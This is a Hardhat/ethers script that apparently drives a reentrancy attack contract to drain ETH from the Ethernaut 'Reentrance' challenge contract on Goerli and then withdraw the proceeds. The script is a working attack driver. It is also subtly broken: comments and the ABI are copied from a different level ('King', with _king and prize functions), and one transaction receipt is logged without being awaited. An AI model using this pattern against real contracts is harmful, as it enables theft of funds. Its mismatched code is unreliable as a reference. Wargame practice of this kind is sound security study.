import { ethers } from "hardhat";

const attackReentrance = async () => {
    // change contract addresses here.
    const reentranceAddress = "0xEfC594B6E8100d412aadc34D4E6ACBbD6CC0E85a"; //type "await contract.address()" in ethernaut console

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the king
    // Additional read to understand more on recieve and transfer to make the contract needed:
    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    // https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            constant: true,
            inputs: [],
            name: "_king",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "prize",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: undefined,
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const attack = await ethers.getContract("AttackReentrance");
    const contract = await ethers.getContractAt(ABI, reentranceAddress);
    // const provider = ethers.getDefaultProvider("goerli");    // alternate defualt provider
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    console.log("Checking current Reentrance Contract balance...");
    let contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
    console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
    const tx = await attack.donateAndWithdraw({ value: ethers.utils.parseEther("0.001") });
    const txReceipt = tx.wait(2);
    console.log(txReceipt);
    console.log("Checking again Reentrance Contract balance...");
    contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
    console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
    if (contractBalance === "0") {
        console.log("Reentrance Contract balance now '0'...");
        console.log("Withdrawing all funds from attack contract...");
        const tx1 = await attack.withdrawAll();
        const tx1Receipt = await tx1.wait();
        console.log(tx1Receipt);
        console.log("Done, Submit to ethernaut.");
    } else {
        console.log("Waiting for a minute...");
        setTimeout(async () => {
            contractBalance = ethers.utils.formatEther(
                await provider.getBalance(reentranceAddress)
            );
            if (contractBalance === "0") {
                console.log("Reentrance Contract balance now '0'...");
                console.log("Withdrawing all funds from attack contract...");
                const tx1 = await attack.withdrawAll();
                const tx1Receipt = await tx1.wait();
                console.log(tx1Receipt);
                console.log("Done, Submit to ethernaut.");
            } else {
                console.log("Reentrance Contract balance not '0'. Review code and try again...");
            }
        }, 60000);
    }
};

attackReentrance()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
